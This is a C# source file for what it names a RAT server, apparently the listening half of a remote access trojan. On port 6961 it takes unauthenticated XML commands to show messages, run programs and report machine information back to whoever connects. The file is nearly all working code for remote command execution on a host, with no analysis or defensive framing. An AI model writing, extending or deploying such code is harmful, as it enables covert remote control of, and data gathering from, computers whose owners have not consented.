using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Serialization;

namespace RATServer
{
    public class Program
    {
        #region "Declarations"
        static int port = 6961;
        static TcpClient sock = new TcpClient();
        static TcpListener tcpc = new TcpListener(port);
        #endregion
        #region "Main"
        static void Main(string[] args)
        {
            Console.WriteLine("Server Running...");
            while (true)
            {
                while (sock.Connected == false) Listen();
                while (sock.Connected) Check();
            }
        }
        #endregion
        #region "Connection Methods"
        static void Listen()
        {
            try
            {
                tcpc.Start();
                sock = new TcpClient();
                sock = tcpc.AcceptTcpClient();
            } catch (Exception ex) 
            {

            }
        }
        static void Check()
        {
            if (sock.Connected)
            {
                sock.SendTimeout = 5000;
                try
                {
                    NetworkStream nstream = sock.GetStream();
                    byte[] message = new byte[sock.ReceiveBufferSize + 1];
                    int bytesRead = 0;
                    bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
                    if (bytesRead == 0)
                    {
                        sock.Close();
                        return;
                    }
                    Command c = DeserializeFromXml<Command>(Encoding.ASCII.GetString(message, 0, bytesRead));
                    Response r = new Response();
                    switch (c.CMD)
                    {
                        case "message":
                            Functions.Message(c.Args[0]);
                            r.Type = "Message"; 
                            r.Msg = "Message Success";
                            break;
                        case "run":
                            Functions.Run(c.Args[0]);
                            r.Type = "Message";
                            r.Msg = "Run Success";
                            break;
                        case "info":                       
                            r.Type = "Message";
                            r.Msg = Functions.PCInfo();
                            break;
                        default:
                            break;
                    }                 
                    Byte[] sendBytes = Encoding.ASCII.GetBytes(SerializeToXml(r));
                    nstream.Write(sendBytes, 0, sendBytes.Length);
                }
                catch (Exception e)
                {
                    Check();
                }
            }
        }
        #endregion
        #region "Helper Methods"
        static T DeserializeFromXml<T>(string xml)
        {
            T z;
            XmlSerializer x = new XmlSerializer(typeof(T));
            using (TextReader y = new StringReader(xml))
            {
                z = (T)x.Deserialize(y);
            }
            return z;
        }
        static string SerializeToXml<T>(T obj)
        {
            XmlSerializer x = new XmlSerializer(typeof(T));
            using (var z = new StringWriter())
            {
                using (XmlTextWriter w = new XmlTextWriter(z) { Formatting = Formatting.Indented })
                {
                    x.Serialize(w, obj);
                    return z.ToString();
                }
            }
        }
        #endregion
    }
    #region "Objects  
    [Serializable]
    public class Command
    {
        public string CMD { get; set; }
        public string[] Args { get; set; }
    }
    [Serializable]
    public class Response
    {
        public string Type { get; set; }
        public string Msg { get; set; }
        public byte[] Data { get; set; }
    }
    #endregion
}